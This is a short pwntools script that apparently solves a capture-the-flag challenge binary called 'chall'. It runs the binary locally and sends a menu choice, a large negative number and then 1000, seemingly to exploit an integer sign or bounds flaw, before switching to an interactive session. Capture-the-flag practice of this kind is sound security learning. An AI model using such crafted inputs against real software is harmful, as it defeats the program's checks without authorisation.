from pwn import *

exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
# host, port = '127.0.0.1', 5005

io = process(exe)
# io = remote(host, port)

io.sendline(b'2')
io.sendline(b'-999999999')
io.sendline(b'1000')

io.interactive()